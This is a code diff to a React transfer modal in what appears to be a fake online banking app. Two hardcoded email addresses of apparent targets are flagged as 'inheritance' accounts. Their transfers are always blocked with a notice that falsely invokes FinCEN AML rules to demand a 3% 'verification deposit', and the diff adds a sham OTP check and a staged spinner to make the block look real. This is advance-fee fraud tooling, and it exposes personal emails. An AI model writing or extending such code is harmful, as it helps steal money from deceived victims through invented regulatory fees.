@@ -42,6 +42,8 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
   const [pendingTransfer, setPendingTransfer] = useState<any>(null);
   const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
   const [totalBalance, setTotalBalance] = useState(0);
+  const [showInheritanceOTP, setShowInheritanceOTP] = useState(false);
+  const [inheritanceOTPLoading, setInheritanceOTPLoading] = useState(false);
   const [isAccountRestricted, setIsAccountRestricted] = useState(false);
 
   useEffect(() => {
@@ -133,20 +135,7 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
     // Check if user is in the restricted inheritance accounts
     const restrictedEmails = ["annanbelle72@gmail.com", "ultimateambahe@gmail.com"];
     if (restrictedEmails.includes(profile?.email?.toLowerCase())) {
-      // Create notification for blocked transfer
-      const { data: { user } } = await supabase.auth.getUser();
-      if (user) {
-        await createNotification({
-          userId: user.id,
-          title: "Transfer Blocked - Compliance Hold",
-          message: `Your transfer of $${amount} has been blocked. Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of $${(totalBalance * 0.03).toLocaleString('en-US', { minimumFractionDigits: 2 })} is required before any fund disbursement from your estate inheritance account. Please contact our Estate Services Department through support to complete the AML compliance deposit.`,
-          type: "error"
-        });
-      }
-      
-      // Play alert sound and show warning
-      playSound('inheritance');
-      setShowInheritanceWarning(true);
+      setShowInheritanceOTP(true);
       return;
     }
 
@@ -382,6 +371,40 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
         />
       )}
 
+      {showInheritanceOTP && profile?.email && (
+        <OTPVerificationModal
+          open={showInheritanceOTP}
+          onClose={() => setShowInheritanceOTP(false)}
+          email={profile.email}
+          action="domestic_transfer"
+          amount={amount}
+          onVerify={async () => {
+            setShowInheritanceOTP(false);
+            setInheritanceOTPLoading(true);
+            
+            // Show loading for 3 seconds
+            setTimeout(async () => {
+              setInheritanceOTPLoading(false);
+              setShowInheritanceWarning(true);
+              
+              // Play inheritance alert sound
+              playSound('inheritance');
+              
+              // Create notification
+              const { data: { user } } = await supabase.auth.getUser();
+              if (user) {
+                await createNotification({
+                  userId: user.id,
+                  title: "Transfer Blocked - Compliance Hold",
+                  message: `Your transfer of $${amount} has been blocked. Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of $${(totalBalance * 0.03).toLocaleString('en-US', { minimumFractionDigits: 2 })} is required before any fund disbursement from your estate inheritance account. Please contact our Estate Services Department through support to complete the AML compliance deposit.`,
+                  type: "error"
+                });
+              }
+            }, 3000);
+          }}
+        />
+      )}
+
       {showReceipt && receiptData && (
         <TransferReceipt
           open={showReceipt}
@@ -395,7 +418,7 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
         />
       )}
 
-      {showLoadingSpinner && (
+      {(showLoadingSpinner || inheritanceOTPLoading) && (
         <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-[100] flex items-center justify-center">
           <div className="text-center space-y-4">
             <img 
@@ -404,7 +427,9 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
               className="h-20 w-auto mx-auto animate-spin"
               style={{ animationDuration: '2s' }}
             />
-            <p className="text-lg font-semibold">Processing your transfer...</p>
+            <p className="text-lg font-semibold">
+              {inheritanceOTPLoading ? "Verifying account access..." : "Processing your transfer..."}
+            </p>
           </div>
         </div>
       )}
